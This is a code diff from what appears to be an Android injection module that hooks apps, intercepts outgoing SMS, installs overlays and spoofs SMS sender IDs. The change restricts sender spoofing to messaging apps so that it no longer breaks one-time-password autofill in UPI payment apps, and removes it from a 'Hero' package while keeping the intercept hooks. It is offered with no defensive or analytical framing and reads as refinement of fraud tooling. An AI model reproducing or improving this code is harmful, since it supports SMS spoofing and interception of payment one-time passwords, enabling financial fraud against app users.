@@ -191,7 +191,8 @@ void* deferred_hook_worker(void* arg) {
             try {
                 overlay_ui::install_sms_tweaks_java(env, job->pkg.c_str());
                 outgoing_sms_hook::arm_intercept_hooks();
-                if (!job->no_inline) {
+                // Sender ID ONLY in Messages — spoofing in UPI breaks OTP autofill
+                if (!job->no_inline && is_messaging_pkg(job->pkg)) {
                     sender_spoof::install(env, job->api, job->pkg.c_str());
                 }
                 append_diag("/data/local/tmp/hivirtus_inject.log",
@@ -368,10 +369,9 @@ public:
             schedule_deferred_java_sms(env_, pkg_, 1);
             report_line(api_, "post_msg_ok:" + pkg_);
         } else if (is_hero_pkg(pkg_)) {
-            // Hero ONLY — Java NOW (token expire window) + Sender ID for OTP read
+            // Hero ONLY — Java NOW (token expire window). No sender_spoof here (OTP).
             outgoing_sms_hook::arm_intercept_hooks();
             overlay_ui::install_sms_tweaks_java(env_, pkg_.c_str());
-            sender_spoof::install(env_, api_, pkg_.c_str());
             schedule_deferred_java_sms(env_, pkg_, 1);
             report_line(api_, "post_hero_fast_java:" + pkg_);
             if (native_overlay_wanted() && overlay_allowed_pkg(pkg_)) {
